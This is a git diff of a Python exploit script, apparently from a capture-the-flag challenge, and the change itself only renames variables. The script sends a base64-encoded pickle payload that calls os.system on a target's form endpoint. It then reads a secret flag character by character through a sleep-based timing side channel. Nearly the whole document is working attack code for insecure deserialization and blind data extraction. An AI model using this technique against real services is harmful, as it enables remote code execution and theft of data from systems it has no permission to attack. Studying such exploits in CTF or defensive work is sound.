@@ -6,30 +6,29 @@ import time
 # will sleep for the ascii value - the given ofset
 def sub_str(start, end):
     with open("substr.sh", mode="rb") as f:
-        file = f.read().strip()
-    file += b' '
-    file += str(start).encode() + b' ' + str(end).encode()
-    return (file)
+        code = f.read().strip()
+    code += b' '
+    code += str(start).encode() + b' ' + str(end).encode()
+    return (code)
 
 # 1 indexed
 def sleep_ascii(idx):
-    file = sub_str(idx, idx)
-    file = file + b" | od -An -tuC | awk '{$1=$1; print}' | cut -d' ' -f1"
-    file = b'sleep $(' + file + b')'
-    return file
+    code = sub_str(idx, idx)
+    code = code + b" | od -An -tuC | awk '{$1=$1; print}' | cut -d' ' -f1"
+    code = b'sleep $(' + code + b')'
+    return code
 
 # 1 indexed
 # will sleep for the ascii value - the given ofset
 def sleep_ascii_offset(idx, offset):
-    file = sub_str(idx, idx)
-    file += b" | od -An -tuC | awk '{$1=$1; print}' | cut -d' ' -f1"
-    file = b'expr $( ' + file + b' ) - ' + str(offset).encode()
-    file = b'sleep $(' + file + b')'
-    return file
+    code = sub_str(idx, idx)
+    code += b" | od -An -tuC | awk '{$1=$1; print}' | cut -d' ' -f1"
+    code = b'expr $( ' + code + b' ) - ' + str(offset).encode()
+    code = b'sleep $(' + code + b')'
+    return code
 
-# file is the bash generated bash code
-def send_file(file):
-    payload = b"cos\nsystem\n(S'" + file + b"'\ntR"
+def send_code(code):
+    payload = b"cos\nsystem\n(S'" + code + b"'\ntR"
     exploit = base64.b64encode(payload).decode()
     form = {
             'data': exploit
@@ -46,10 +45,10 @@ def send_file(file):
 def get_flag_len():
     return 24 #idk broke but i got the length before it broke
     with open('srcipt_len_back.sh', mode='rb') as f:
-        file = f.read()
+        code = f.read()
 
-    print(f"script : {file.decode()}")
-    flag_len = int(send_file(file))
+    print(f"script : {code.decode()}")
+    flag_len = int(send_code(code))
     print(f"flag_len: {flag_len}")
     return (flag_len)
 
@@ -59,9 +58,9 @@ flag_len = get_flag_len()
 
 flag = ""
 for i in range(1, flag_len + 1):
-    file = sleep_ascii_offset(i, 33)
-    print(f"script : {file.decode()}")
-    runtime = send_file(file)
+    code = sleep_ascii_offset(i, 33)
+    print(f"script : {code.decode()}")
+    runtime = send_code(code)
     flag += chr(int(runtime + 33))
     print(f"cur flag: {flag}")
 
